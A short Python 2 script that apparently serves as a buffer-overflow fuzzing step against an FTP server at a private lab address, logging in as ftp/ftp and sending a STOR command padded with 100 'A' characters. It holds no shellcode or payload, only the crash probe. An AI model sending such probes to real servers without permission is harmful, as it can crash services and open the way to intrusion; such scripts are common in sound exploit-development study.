#!/usr/bin/python
import sys
import socket
import time

rhost = '172.16.162.136'

buffer = "A" * 100
buffer +='\r\n'
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, 21))
        print s.recv(2048)
        s.send('USER ftp\r\n')
        print s.recv(2048)
        s.send('PASS ftp\r\n')
        print s.recv(2048)
        s.send('STOR ' + buffer)
        print s.recv(2048)
        s.close()
        print "Sent Buffer of %s bytes" %len(buffer)
except socket.error as error:
        s.close()
        print error
